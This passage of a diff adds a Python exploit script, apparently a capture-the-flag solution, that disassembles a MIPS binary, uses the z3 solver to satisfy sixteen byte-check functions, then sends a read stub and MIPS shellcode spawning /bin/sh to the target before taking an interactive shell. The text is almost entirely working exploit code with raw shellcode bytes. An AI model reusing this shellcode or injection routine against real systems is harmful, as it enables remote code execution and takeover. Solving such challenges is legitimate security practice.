+            r"negu \$v\d, \$v\d;"
+            "slt ..., ..., ...;"
+             "(bnez|beqz)")
+    cmps = cmp_pattern.findall(insts)
+    return (iter(idxs), iter(consts), iter(cmps))
+
+
+def solve_func(func):
+
+    def np():
+        return p[next(idxs)]
+
+    def nc():
+        return next(consts)
+
+    s = Solver()
+    p = [BitVec(f"p{i}", 32) for i in range(4)]
+    s.add(*[pp <= 255 for pp in p])
+    s.add(*[pp >= 0   for pp in p])
+    idxs, consts, cmps = extract_template_vars(func)
+
+    if test_range(func, [190, 210]):
+        z3_expr = Not(Or(
+            np() + np() == nc(),
+            np() + np() == nc(),
+            np() + np() == nc(),
+        ))
+    elif test_range(func, [250, 280]):
+        z3_expr = And(
+            np() ^ np() == nc(),
+            np() == nc(),
+            np() == ( ( ( np() ^ np() ) & 0x7f ) << 1 ),
+            np() == ( np() ^ np() ^ np() )
+        )
+    elif test_range(func, [176, 184]):
+        z3_expr = And(
+            np() == np(),
+            np() == np(),
+            np() == nc(),
+            np() == nc(),
+        )
+    elif test_range(func, [308, 328]):
+
+        def trunc(x):
+            return Extract(7, 0, x) # Cast to byte
+
+        z3_expr = And(
+            np() == nc(),
+            np() == nc(),
+            trunc(np()) == trunc(np())*trunc(np()),
+            trunc(np()) == ( trunc(np())*trunc(np()) +
+                             trunc(np())*trunc(np()) -
+                             trunc(np())*trunc(np()) ),
+        )
+    elif test_range(func, [300, 304]):
+        z3_expr = And(
+            np() + np() + np() == nc(),
+            np() + np() + np() == nc(),
+            np() + np() + np() == nc(),
+            np() + np() + np() == nc(),
+        )
+    elif test_range(func, [440, 444]):
+
+        def Abs(x):
+            return If(x >= 0, x, -x)
+
+        def F():
+            return Abs(np() * np() - np() * np())
+
+        i1 = F()
+        i2 = F()
+        c2 = If(next(cmps) == "beqz", i1 < i2, i1 >= i2)
+        i1 = F()
+        i2 = F()
+        c1 = If(next(cmps) == "beqz", i1 < i2, i1 >= i2)
+
+        z3_expr = And(c1, c2)
+    else:
+        assert 0, f"{len(func)} {func}"
+
+    s.add(z3_expr)
+    s.check()
+    m = s.model()
+    return bytes([m.eval(pp).as_long() for pp in p])
+
+
+if __name__ == "__main__":
+
+    # filename = "code.3"
+    # with open(filename, "rb") as f:
+    #     elf = f.read()
+    # r = process(f"qemu-mipsel -strace ./{filename}", shell=True)
+    elf = get_binary()
+
+    m = re.search(end_func_bytes, elf)
+    assert m
+    start = m.span()[1]
+    code = elf[start:]
+
+    funcs = []
+    func = []
+    insts = md.disasm_lite(elf[start:], 0)
+    for inst in insts:
+        func.append(inst)
+        if inst[2] == "jr":
+            funcs.append(func)
+            if len(funcs) == 16:
+                break
+            func = []
+
+    solution = b""
+    for func in reversed(funcs):
+        solution += solve_func(func)
+
+    print(solution)
+
+    r.send(solution)
+    r.recvuntil("Name")
+    r.send("A")
+    sleep(0.5)
+    read_shellcode = bytes.fromhex("00 01 06 20 A3 0F 02 24 0C 00 00 00")
+    r.send(read_shellcode)
+    sleep(0.5)
+    shellcode = bytes.fromhex("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 73 06 24 FF FF D0 04 50 73 0F 24 FF FF 06 28 E0 FF BD 27 D7 FF 0F 24 27 78 E0 01 21 20 EF 03 E8 FF A4 AF EC FF A0 AF E8 FF A5 23 AB 0F 02 24 0C 01 01 01 2F 62 69 6E 2F 73 68 00")
+    r.send(shellcode)
+    r.interactive()
+```
+
 
 
